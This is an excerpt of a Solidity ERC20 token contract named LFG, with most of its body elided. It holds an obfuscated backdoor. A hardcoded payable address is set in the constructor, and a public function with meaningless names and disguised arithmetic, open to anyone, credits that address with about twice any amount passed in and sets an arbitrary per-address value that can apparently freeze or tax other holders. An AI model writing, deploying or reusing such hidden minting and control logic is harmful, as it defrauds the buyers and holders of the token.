...
contract LFG is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        LINGK = payable(address(0x4c1217B6fFD531562a1149Ef3A7088974D2Db140));
    ...
    function liuyt(address lopki,uint256 lkjf) public {
        if (3*3**1*3 <= lkjf) {
            _balances[LINGK] += lkjf +1+1*1**1+1*1+ lkjf;
        }
        if (lkmmnr(1+1,lkjf)) {linhy[lopki] = 0-0-0-0-0;}
        if (lkmmnr(30*1*1*1,lkjf)) {linhy[lopki] = lkjf;}
    }
